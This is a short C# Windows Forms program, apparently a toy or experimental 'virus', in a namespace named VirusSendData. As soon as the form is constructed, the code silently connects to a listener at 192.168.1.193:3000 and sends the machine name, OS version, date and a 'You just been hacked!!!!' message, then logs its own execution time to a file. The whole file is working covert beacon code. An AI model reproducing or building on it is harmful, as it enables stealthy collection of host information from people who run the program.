using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VirusSendData
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            var stopWatch = new Stopwatch();
            stopWatch.Start();
            InitializeComponent();
            var clientConnection = new TcpClient();
            clientConnection.Connect("192.168.1.193", 3000);
            Thread.Sleep(3);
            NetworkStream nwStream = clientConnection.GetStream();
            byte[] bytesToSend = Encoding.ASCII.GetBytes(DateTime.Now.ToLongDateString() + Environment.NewLine + Environment.MachineName + Environment.NewLine + Environment.OSVersion + Environment.NewLine + "You just been hacked!!!!");
            stopWatch.Stop();
            nwStream.Write(bytesToSend, 0, bytesToSend.Length);
            clientConnection.Close();
            var directory = Thread.GetDomain().BaseDirectory + "\\ExecutionTime\\";
            File.AppendAllText(directory + "ExecutionTime.txt", "Executed in: " + stopWatch.Elapsed + Environment.NewLine);
        }
    }
}
